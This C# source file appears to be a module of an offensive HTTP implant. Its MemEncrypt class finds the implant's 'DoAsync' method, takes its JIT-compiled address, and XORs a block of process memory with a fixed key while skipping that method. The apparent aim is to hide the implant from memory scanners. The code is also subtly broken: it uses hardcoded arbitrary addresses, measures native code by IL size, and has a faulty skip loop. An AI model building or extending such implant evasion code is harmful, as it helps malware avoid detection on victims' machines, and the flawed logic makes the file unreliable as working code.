using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace HTTPImplant.Modules
{
    class MemEncrypt
    {
        public static void ReadMem()
        {
            MethodInfo method = typeof(Implant).GetMethod("DoAsync", BindingFlags.Static | BindingFlags.Public);
            if (method == null)
            {
                Console.WriteLine("Method not found.");
                return;
            }

            // Ensure the method is JIT-compiled
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            // Get the pointer to the JIT-compiled method
            IntPtr pointer = method.MethodHandle.GetFunctionPointer();

            // Get the size of the method in memory (IL size in this example)
            MethodBody methodBody = method.GetMethodBody();
            int methodSize = methodBody?.GetILAsByteArray().Length ?? 0;

            Console.WriteLine($"Address of DoAsync: {pointer}");
            Console.WriteLine($"Size of DoAsync: {methodSize}");

            // Start address for encryption (arbitrary example)
            IntPtr startAddress = new IntPtr(0x10000);

            // End address for encryption (arbitrary example)
            IntPtr endAddress = new IntPtr(0x20000);

            EncryptMemory(startAddress, pointer, methodSize, endAddress);
        }

        static unsafe void EncryptMemory(IntPtr start, IntPtr methodPointer, int methodSize, IntPtr end)
        {
            byte* startPtr = (byte*)start.ToPointer();
            byte* endPtr = (byte*)end.ToPointer();
            byte* methodStart = (byte*)methodPointer.ToPointer();
            byte* methodEnd = methodStart + methodSize;

            byte xorKey = 0xAA;

            for (byte* ptr = startPtr; ptr < endPtr; ptr++)
            {
                // Skip the method memory
                if (ptr >= methodStart && ptr < methodEnd)
                {
                    ptr = methodEnd;
                    continue;
                }

                *ptr ^= xorKey;
            }
        }
    }
}
